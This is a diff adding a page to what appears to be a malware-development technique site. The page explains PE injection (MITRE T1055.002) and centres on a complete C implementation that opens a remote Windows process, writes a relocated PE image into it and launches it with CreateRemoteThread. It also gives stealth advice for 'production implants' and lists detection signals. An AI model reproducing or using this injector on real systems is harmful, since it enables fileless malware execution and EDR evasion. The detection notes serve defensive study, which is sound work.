@@ -1,0 +1,241 @@
+---
+title: PE Injection
+mitre: T1055.002
+category: injection
+group: Process Injection
+summary: Allocate memory in a target process, write a full PE image into it, resolve its imports, and execute it — without writing a file to disk.
+platform: [Windows]
+tags: ['C / C++', 'WinAPI', 'x64']
+updated: '2026-08-04'
+author: thehackersbrain
+readingTime: 8 min read
+callChain:
+  - call: OpenProcess(PROCESS_ALL_ACCESS)
+    desc: Get a handle to the target process with VM read/write and create-thread permissions.
+    dll: kernel32
+  - call: VirtualAllocEx(MEM_COMMIT, PAGE_READWRITE)
+    desc: Allocate enough space for the PE headers plus all sections at a base of our choosing.
+    dll: kernel32
+  - call: WriteProcessMemory (headers + sections)
+    desc: Copy the DOS header, NT headers, and each section into the remote allocation at its correct virtual offset.
+    dll: kernel32
+  - call: fix base relocations
+    desc: If the PE loaded at a different base than preferred, apply delta relocations to all absolute address references.
+    dll: —
+  - call: resolve import table
+    desc: Walk the IMAGE_IMPORT_DESCRIPTOR entries; call LoadLibrary/GetProcAddress in the remote process to fill the IAT.
+    dll: kernel32
+  - call: VirtualProtectEx (RX) + CreateRemoteThread
+    desc: Mark the .text section executable and start a thread at the PE entry point.
+    dll: kernel32
+detections:
+  - src: SYSMON EID 8
+    text: CreateRemoteThread with start address pointing to private, non-image-backed memory in the target.
+  - src: SYSMON EID 10
+    text: OpenProcess with PROCESS_VM_WRITE | PROCESS_VM_OPERATION from an unexpected source process.
+  - src: MEMORY SCAN
+    text: MZ/PE header (4D 5A, 50 45) in a private RX region — malfind hits this reliably.
+  - src: ETW-TI
+    text: Thread start address in a region with no backing module entry in the PEB loader list.
+related:
+  - mitre: T1055.012
+    title: Process Hollowing
+    desc: Replace the target's own image rather than injecting alongside it.
+    href: /techniques/injection/process-hollowing
+  - mitre: T1055
+    title: Reflective DLL Loading
+    desc: The DLL-form variant — the PE image resolves its own imports and relocations without external help.
+    href: /techniques/injection/reflective-dll-loading
+  - mitre: T1027
+    title: Position-Independent Code
+    desc: PIC shellcode avoids the PE overhead of import tables and base relocations.
+    href: /techniques/loaders/position-independent-code
+labKit:
+  - label: pe-inject.c
+    href: 'https://github.com/thehackersbrain/maldev-lab-kit'
+  - label: Sigma rule pack
+    href: /detections
+---
+
+import Callout from '../../../components/Callout.astro';
+import CallChain from '../../../components/CallChain.astro';
+import CodeBlock from '../../../components/CodeBlock.astro';
+import DetectionGrid from '../../../components/DetectionGrid.astro';
+import RelatedList from '../../../components/RelatedList.astro';
+
+## Overview
+
+PE injection copies a full Portable Executable image into a remote process's virtual address space and executes it from there. Unlike DLL injection (which uses `LoadLibrary` to load a file from disk), PE injection works entirely in memory — the PE bytes come from a buffer, a resource, or a network download and never touch the filesystem.
+
+The core challenge is that PE files are not position-independent. They assume a preferred base address embedded in the optional header; if the image loads elsewhere, every absolute address in the binary is wrong. The injector must:
+1. Fix base relocations (applying a delta to all absolute addresses).
+2. Resolve the import table (loading required DLLs and filling the IAT with function pointers).
+
+These operations happen in the context of the **injector**, acting on behalf of the **target** — the memory is written to the target but the relocation and IAT fixup logic runs in the injector process.
+
+<Callout type="note">
+  PE injection creates a persistent MZ/PE signature in private memory that `malfind` reliably
+  detects. For stealth, prefer reflective loading (the PE resolves its own imports from inside
+  the target) or Donut (converts the PE to PIC shellcode with no PE header in memory).
+  Raw PE injection is most useful for rapid PoC work, not production implants.
+</Callout>
+
+## The call chain
+
+<CallChain steps={frontmatter.callChain} />
+
+## Reference implementation
+
+<CodeBlock
+  file="pe_inject.c"
+  label="C"
+  lang="c"
+  class="mb-7.5"
+  code={`#include <windows.h>
+
+// Fix base relocations after the PE is mapped at a non-preferred base.
+static void fix_relocations(BYTE *remote_base, BYTE *local_image,
+                             ULONG_PTR preferred_base) {
+    PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)local_image;
+    PIMAGE_NT_HEADERS nt  = (PIMAGE_NT_HEADERS)(local_image + dos->e_lfanew);
+
+    DWORD reloc_rva = nt->OptionalHeader.DataDirectory[5].VirtualAddress;
+    if (!reloc_rva) return;  // no relocation directory
+
+    LONG_PTR delta = (LONG_PTR)remote_base - (LONG_PTR)preferred_base;
+    PIMAGE_BASE_RELOCATION reloc =
+        (PIMAGE_BASE_RELOCATION)(local_image + reloc_rva);
+
+    while (reloc->VirtualAddress) {
+        WORD *entries = (WORD*)((BYTE*)reloc + sizeof *reloc);
+        DWORD entry_count = (reloc->SizeOfBlock - sizeof *reloc) / sizeof(WORD);
+
+        for (DWORD i = 0; i < entry_count; i++) {
+            WORD type   = entries[i] >> 12;
+            WORD offset = entries[i] & 0x0FFF;
+            if (type == IMAGE_REL_BASED_DIR64) {
+                LONGLONG *target = (LONGLONG*)(
+                    local_image + reloc->VirtualAddress + offset);
+                *target += delta;
+            }
+        }
+        reloc = (PIMAGE_BASE_RELOCATION)((BYTE*)reloc + reloc->SizeOfBlock);
+    }
+}
+
+// Resolve the import table — load DLLs and fill the IAT in the LOCAL image copy,
+// then write the fixed-up IAT section to the remote process.
+static BOOL fix_imports(HANDLE hProc, BYTE *local_image, BYTE *remote_base) {
+    PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)local_image;
+    PIMAGE_NT_HEADERS nt  = (PIMAGE_NT_HEADERS)(local_image + dos->e_lfanew);
+
+    DWORD import_rva = nt->OptionalHeader.DataDirectory[1].VirtualAddress;
+    if (!import_rva) return TRUE;  // no imports
+
+    PIMAGE_IMPORT_DESCRIPTOR imp =
+        (PIMAGE_IMPORT_DESCRIPTOR)(local_image + import_rva);
+
+    for (; imp->Name; imp++) {
+        char *dll_name = (char*)(local_image + imp->Name);
+        HMODULE dll = LoadLibraryA(dll_name);
+        if (!dll) return FALSE;
+
+        PIMAGE_THUNK_DATA orig_thunk =
+            (PIMAGE_THUNK_DATA)(local_image + imp->OriginalFirstThunk);
+        PIMAGE_THUNK_DATA iat =
+            (PIMAGE_THUNK_DATA)(local_image + imp->FirstThunk);
+
+        for (; orig_thunk->u1.AddressOfData; orig_thunk++, iat++) {
+            FARPROC fn;
+            if (IMAGE_SNAP_BY_ORDINAL(orig_thunk->u1.Ordinal)) {
+                fn = GetProcAddress(dll,
+                    (char*)(ULONG_PTR)IMAGE_ORDINAL(orig_thunk->u1.Ordinal));
+            } else {
+                PIMAGE_IMPORT_BY_NAME ibn =
+                    (PIMAGE_IMPORT_BY_NAME)(local_image + orig_thunk->u1.AddressOfData);
+                fn = GetProcAddress(dll, (char*)ibn->Name);
+            }
+            if (!fn) return FALSE;
+            iat->u1.Function = (ULONG_PTR)fn;
+        }
+    }
+    return TRUE;
+}
+
+// Full PE injection into a remote process
+BOOL inject_pe(DWORD pid, const BYTE *pe_bytes, size_t pe_len) {
+    PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)pe_bytes;
+    PIMAGE_NT_HEADERS nt  = (PIMAGE_NT_HEADERS)(pe_bytes + dos->e_lfanew);
+
+    SIZE_T image_size = nt->OptionalHeader.SizeOfImage;
+
+    // 1. Allocate space in the target
+    HANDLE proc = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
+    BYTE *remote_base = (BYTE*)VirtualAllocEx(proc, NULL, image_size,
+        MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+    if (!remote_base) { CloseHandle(proc); return FALSE; }
+
+    // 2. Build a local copy of the mapped image for fixups
+    BYTE *local_image = (BYTE*)VirtualAlloc(NULL, image_size,
+        MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+
+    // Copy headers
+    memcpy(local_image, pe_bytes, nt->OptionalHeader.SizeOfHeaders);
+
+    // Copy sections to their virtual offsets
+    PIMAGE_SECTION_HEADER sec = IMAGE_FIRST_SECTION(nt);
+    for (WORD i = 0; i < nt->FileHeader.NumberOfSections; i++, sec++) {
+        memcpy(local_image + sec->VirtualAddress,
+               pe_bytes + sec->PointerToRawData,
+               sec->SizeOfRawData);
+    }
+
+    // 3. Fix relocations in the local copy
+    fix_relocations(remote_base, local_image,
+        (ULONG_PTR)nt->OptionalHeader.ImageBase);
+
+    // 4. Resolve imports in the local copy
+    if (!fix_imports(proc, local_image, remote_base)) {
+        VirtualFree(local_image, 0, MEM_RELEASE);
+        CloseHandle(proc);
+        return FALSE;
+    }
+
+    // 5. Write the fixed-up image to the remote process
+    WriteProcessMemory(proc, remote_base, local_image, image_size, NULL);
+    VirtualFree(local_image, 0, MEM_RELEASE);
+
+    // 6. Set .text section RX, launch a thread at the entry point
+    DWORD old;
+    VirtualProtectEx(proc, remote_base,
+        nt->OptionalHeader.SizeOfCode, PAGE_EXECUTE_READ, &old);
+
+    BYTE *entry = remote_base + nt->OptionalHeader.AddressOfEntryPoint;
+    HANDLE t = CreateRemoteThread(proc, NULL, 0,
+        (LPTHREAD_START_ROUTINE)entry, NULL, 0, NULL);
+
+    if (t) CloseHandle(t);
+    CloseHandle(proc);
+    return t != NULL;
+}`}
+/>
+
+## PE vs reflective loading vs Donut
+
+| Property | Raw PE injection | Reflective DLL | Donut shellcode |
+|---|---|---|---|
+| MZ header in memory | Yes (malfind-detectable) | Yes | No (header zeroed) |
+| On-disk IAT fixup | Injector must do it | DLL does it internally | Donut stub does it |
+| Process of entry | Injector (OOM writes) | Target (reflective loader) | Target (shellcode stub) |
+| Suitable for shellcode loaders | No (not PIC) | Partially | Yes |
+| EDR detection surface | High | Moderate | Low |
+
+## Detection
+
+<DetectionGrid items={frontmatter.detections} />
+
+The MZ/PE header in private memory is the most reliable indicator — it is not a false-positive-prone signal because legitimate code never appears in private (MEM_PRIVATE) allocations. Volatility's `malfind` plugin specifically looks for `PAGE_EXECUTE` private regions starting with the MZ magic bytes. Pair this with Sysmon EID 8 (CreateRemoteThread) for a confirmed injection indicator.
+
+## Variants & related
+
+<RelatedList items={frontmatter.related} />
